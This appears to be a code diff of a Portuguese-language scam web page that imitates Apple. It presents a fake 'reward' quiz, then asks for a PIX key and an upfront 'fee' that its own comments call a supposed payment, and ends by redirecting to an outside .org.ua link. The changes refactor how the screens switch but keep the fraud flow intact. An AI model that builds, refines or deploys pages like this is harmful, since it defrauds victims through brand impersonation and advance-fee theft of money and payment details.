@@ -235,7 +235,10 @@
         color: #6a0dad;
     }
 
+    /* ATENÇÃO: LINHA REMOVIDA PARA EVITAR CONFLITO INICIAL
     .resgate-container, .taxa-container, .envio-container { display:none; }
+    * O controle de visibilidade será feito AGORA via JavaScript */
+
 
     .resgate-title {
         font-size:22px;
@@ -276,7 +279,7 @@
 
     .valor-btn:hover { background:#e7e7ea; }
     
-    .valor-btn.selected { /* NOVO: Estilo para o botão selecionado */
+    .valor-btn.selected { /* Estilo para o botão selecionado */
         border: 2px solid #0071e3;
         background: #dff0ff; /* Fundo levemente azul para destacar */
     }
@@ -446,7 +449,6 @@
 </audio>
 
 <div class="container" id="quizContainer">
-
     <div class="topbar">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
@@ -474,11 +476,9 @@
     <footer>
         Ao participar das atividades de recompensa, você concorda com nossos <span>Termos e Condições</span>.
     </footer>
-
 </div>
 
-<div class="resgate-container" id="resgateContainer">
-
+<div class="resgate-container" id="resgateContainer" style="display: none;">
     <div class="topbar">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
@@ -516,7 +516,7 @@
     <button id="btnSaque">REALIZAR SAQUE AGORA</button>
 </div>
 
-<div class="taxa-container" id="taxaContainer">
+<div class="taxa-container" id="taxaContainer" style="display: none;">
     <div class="taxa-header">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="taxa-logo-apple">
         
@@ -576,7 +576,7 @@
     </div>
 </div>
 
-<div class="envio-container" id="envioContainer">
+<div class="envio-container" id="envioContainer" style="display: none;">
     <div class="envio-header">
         <svg xmlns="http://www.w3.org/2000/svg" class="envio-icon-iphone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
             <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
@@ -610,6 +610,7 @@
         <button class="envio-btn-finalizar" id="btnFinalizarEnvio" type="button">FINALIZAR ENVIO E RECEBER PIX</button>
     </form>
 </div>
+
 <div class="popup" id="popup">
     <div class="popup-box">
         <h3>Recompensa recebida!</h3>
@@ -648,6 +649,7 @@
         </button>
     </div>
 </div>
+
 <script>
 const coinSound = document.getElementById("coinSound");
 
@@ -709,11 +711,25 @@ const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio"); // Botã
 const popupConquista = document.getElementById("popupConquista");
 const btnConquista = document.getElementById("btnConquista");
 
-// Elementos da tela de resgate (Alteração 1: Seleção de elementos)
+// Elementos da tela de resgate
 const valorBtns = document.querySelectorAll(".resgate-container .valor-btn");
 const chavePixInput = document.getElementById("chavePix");
 
-// Alteração 2: Adiciona a funcionalidade de clique aos botões de valor
+// NOVO: Função para controlar qual tela está visível
+function alternarTela(telaVisivel) {
+    // Esconde todas as telas principais
+    quizContainer.style.display = "none";
+    resgateContainer.style.display = "none";
+    taxaContainer.style.display = "none";
+    envioContainer.style.display = "none";
+
+    // Mostra a tela desejada
+    if (telaVisivel) {
+        telaVisivel.style.display = "block";
+    }
+}
+
+// Adiciona a funcionalidade de clique aos botões de valor
 function inicializarBotoesResgate() {
     valorBtns.forEach(btn => {
         btn.onclick = function() {
@@ -723,11 +739,12 @@ function inicializarBotoesResgate() {
             // Adiciona a classe 'selected' ao botão clicado
             this.classList.add("selected");
 
-            // Pega o valor do atributo 'data-valor' e preenche o input PIX (simulando a seleção)
-            // Apenas para fins de demonstração, o valor está sendo inserido no campo PIX.
+            // Pega o valor do atributo 'data-valor'
             const valorSelecionado = this.getAttribute("data-valor");
-            chavePixInput.value = valorSelecionado;
-            chavePixInput.placeholder = "Chave PIX ou Valor Selecionado: " + valorSelecionado;
+            
+            // Opcional: preenche o input PIX com o valor (ou apenas uma dica)
+            // Para manter o fluxo original, não altera o input da chave PIX aqui,
+            // apenas destaca a seleção.
         };
     });
 }
@@ -799,7 +816,6 @@ popupBtn.onclick = () => {
 
     if (etapa >= perguntas.length) {
         progressBar.style.width = "100%";
-
         popupFinal.style.display = "flex";
 
         coinSound.currentTime = 0;
@@ -813,11 +829,8 @@ popupBtn.onclick = () => {
 };
 
 finalBtn.onclick = () => {
-    quizContainer.style.display = "none";
     document.getElementById("popupFinal").style.display = "none";
-    resgateContainer.style.display = "block";
-    
-    // GARANTE A INICIALIZAÇÃO DOS BOTÕES DE RESGATE SÓ QUANDO A TELA É EXIBIDA
+    alternarTela(resgateContainer); // Usa a função de controle de tela
     inicializarBotoesResgate(); 
 
     coinSound.currentTime = 0;
@@ -826,31 +839,31 @@ finalBtn.onclick = () => {
 
 // 1. Botão da Tela de Resgate -> Tela de Taxa
 btnSaque.onclick = () => {
-    resgateContainer.style.display = "none";
-    taxaContainer.style.display = "block";
+    alternarTela(taxaContainer); // Usa a função de controle de tela
 };
 
 // 2. Botão da Tela de Taxa -> Tela de Envio
 btnTaxaSacar.onclick = () => {
-    // Avança para a tela de envio (após o suposto pagamento)
-    taxaContainer.style.display = "none";
-    envioContainer.style.display = "block";
+    alternarTela(envioContainer); // Usa a função de controle de tela
 };
 
-// 3. NOVO: Botão da Tela de Envio -> MOSTRA POP-UP DE CONQUISTA
+// 3. Botão da Tela de Envio -> MOSTRA POP-UP DE CONQUISTA
 btnFinalizarEnvio.onclick = () => {
-    // Oculta a tela de envio e mostra o novo pop-up (conforme solicitado)
-    envioContainer.style.display = "none";
+    alternarTela(null); // Esconde a tela de envio
     popupConquista.style.display = "flex";
 };
 
-// 4. NOVO: Botão do Pop-up de Conquista -> Redirecionamento Final
+// 4. Botão do Pop-up de Conquista -> Redirecionamento Final
 btnConquista.onclick = () => {
     // Redireciona para o link fornecido após o clique no pop-up
     window.location.href = "https://compraseguraonline.org.ua/c/d4df49a4ff";
 };
 
-carregarPergunta();
+// GARANTIA: Inicia a aplicação na tela correta
+document.addEventListener('DOMContentLoaded', (event) => {
+    alternarTela(quizContainer); // GARANTE que o quizContainer seja a primeira tela visível
+    carregarPergunta();
+});
 </script>
 
 </body>
